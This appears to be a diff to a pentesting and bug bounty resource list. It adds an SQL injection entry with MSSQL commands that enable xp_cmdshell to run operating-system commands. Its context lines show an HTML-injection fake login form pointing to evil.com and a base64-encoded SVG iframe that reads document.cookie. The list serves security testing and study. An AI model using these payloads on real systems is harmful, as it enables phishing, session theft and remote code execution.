@@ -14,6 +14,7 @@ Here I gather all the resources about PenTesting and Bug Bounty Hunting that I f
 - [WordPress](#wordpress)
 - [CSP](#csp)
 - [XSS](#xss)
+- [SQLi](#sqli)
 - [Linux](#linux)
 
 ### To Read list
@@ -111,8 +112,16 @@ To analyze the schema: [vangoncharov.github.io/graphql-voyager/](https://ivangon
 - HTML inj `<p style="color:red">ERROR! Repeat the login</p>Membership No.<br/><input><br/><a href=http://evil.com><br><input type=button value="Login"></a><br/><img src=http://evil.com style="visibility:hidden">`
 - iframe + base64 encoded SVG `<iframe src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBzdGFuZGFsb25lPSJubyI/Pgo8IURPQ1RZUEUgc3ZnIFBVQkxJQyAiLS8vVzNDLy9EVEQgU1ZHIDEuMS8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9HcmFwaGljcy9TVkcvMS4xL0RURC9zdmcxMS5kdGQiPgoKPHN2ZyB2ZXJzaW9uPSIxLjEiIGJhc2VQcm9maWxlPSJmdWxsIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgogICA8cmVjdCB3aWR0aD0iMzAwIiBoZWlnaHQ9IjEwMCIgc3R5bGU9ImZpbGw6cmdiKDAsMCwyNTUpO3N0cm9rZS13aWR0aDozO3N0cm9rZTpyZ2IoMCwwLDApIiAvPgogICA8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+CiAgICAgIGFsZXJ0KGRvY3VtZW50LmRvbWFpbik7CiAgICAgIGFsZXJ0KGRvY3VtZW50LmNvb2tpZSk7CiAgIDwvc2NyaXB0Pgo8L3N2Zz4="></iframe>`
 
-### Linux
+### SQLi
 
+- To RCE:
+   ```sql
+   EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+   EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+   xp_cmdshell 'COMMAND';
+   ```
+
+### Linux
 
 **Linux Commands**
 ```
